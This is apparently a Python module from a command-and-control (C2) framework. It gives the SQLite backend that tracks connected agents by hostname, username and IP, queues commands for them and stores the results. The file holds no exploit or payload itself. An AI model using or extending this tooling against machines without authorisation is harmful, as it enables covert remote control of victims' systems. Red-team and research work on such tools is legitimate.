# c2/database.py - Banco de dados SQLite

import sqlite3
from datetime import datetime
from typing import List, Dict

class Database:
    def __init__(self, db_path="c2_database.db"):
        self.db_path = db_path
        self._init_db()
    
    def _init_db(self):
        """Cria tabelas necessárias"""
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS agents (
                    id TEXT PRIMARY KEY,
                    hostname TEXT,
                    username TEXT,
                    ip TEXT,
                    first_seen TIMESTAMP,
                    last_seen TIMESTAMP,
                    status TEXT DEFAULT 'active'
                );
                
                CREATE TABLE IF NOT EXISTS tasks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT,
                    command TEXT,
                    status TEXT DEFAULT 'pending',
                    result TEXT,
                    created_at TIMESTAMP,
                    executed_at TIMESTAMP,
                    FOREIGN KEY (agent_id) REFERENCES agents(id)
                );
            """)
    
    def register_agent(self, agent_id, hostname, ip, username=None):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO agents 
                (id, hostname, username, ip, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (agent_id, hostname, username, ip, datetime.now(), datetime.now()))
    
    def update_heartbeat(self, agent_id):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("UPDATE agents SET last_seen = ? WHERE id = ?",
                        (datetime.now(), agent_id))
    
    def add_task(self, agent_id, command):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("""
                INSERT INTO tasks (agent_id, command, created_at)
                VALUES (?, ?, ?)
            """, (agent_id, command, datetime.now()))
            return cursor.lastrowid
    
    def get_pending_tasks(self, agent_id):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("""
                SELECT id, command FROM tasks 
                WHERE agent_id = ? AND status = 'pending'
                ORDER BY created_at
            """, (agent_id,))
            return [dict(row) for row in cursor.fetchall()]
    
    def update_task_result(self, task_id, result):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                UPDATE tasks 
                SET status = 'completed', result = ?, executed_at = ?
                WHERE id = ?
            """, (result, datetime.now(), task_id))
    
    def get_all_agents(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC")
            return [dict(row) for row in cursor.fetchall()]
    
    def get_agent_tasks(self, agent_id, limit=50):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("""
                SELECT * FROM tasks 
                WHERE agent_id = ? 
                ORDER BY created_at DESC LIMIT ?
            """, (agent_id, limit))
            return [dict(row) for row in cursor.fetchall()]